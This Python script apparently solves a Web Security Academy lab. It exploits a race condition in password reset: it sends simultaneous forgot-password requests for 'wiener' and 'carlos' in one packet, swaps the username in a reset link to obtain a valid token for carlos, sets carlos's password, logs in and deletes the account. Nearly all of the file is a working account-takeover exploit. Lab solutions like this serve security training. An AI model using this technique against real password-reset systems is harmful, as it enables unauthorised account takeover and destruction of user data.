from web_security_academy.core.email_client import EmailClient
from web_security_academy.core.logger import logger

from urllib.parse import urljoin
from requests import Request
import re


def solve_lab(session):
    logger.info(
        'Attempting to generate identical password reset tokens for "wiener" and "carlos"...'
    )

    prepped = []
    forgot_password_url = urljoin(session.url, "/forgot-password")
    usernames = ["wiener", "wiener", "carlos", "wiener", "wiener"]
    for username in usernames:
        # Bypass PHP's session-based locking mechanism
        session.cookies.clear_session_cookies()
        csrf = session.get_csrf_token("/forgot-password")

        data = {"csrf": csrf, "username": username}
        req = Request("POST", forgot_password_url, data=data)
        prepped.append(session.prepare_request(req))

    responses = session.single_packet_send(*prepped)
    logger.info('Simultanenously sent "Forgot password" requests for:')
    logger.info(" - wiener")
    logger.info(" - carlos")

    email_client = EmailClient(session)
    logger.info("Checking email for password reset tokens...")
    for i in range(len(usernames) - 1):
        body = email_client.emails[-i]["Body"]
        href = body.select_one("a").get("href")
        token = re.search(r"token=(.*)", href).group(1)

        href = href.replace("wiener", "carlos")
        resp = session.get(href)
        if resp.status_code != 400:
            logger.success(f"Found valid token: {token}")
            break
    else:
        logger.failure("Unable to find a valid password reset token")
        return

    csrf = session.get_csrf_token(f"/forgot-password?user=carlos&token={token}")
    data = {
        "csrf": csrf,
        "token": token,
        "user": "carlos",
        "new-password-1": "123456",
        "new-password-2": "123456",
    }
    session.post_path("/forgot-password", data=data)
    logger.info('Reset carlos\'s password to "123456"')

    session.login("carlos", "123456")
    session.get_path("/admin/delete?username=carlos")
    logger.info('Deleted user "carlos"')
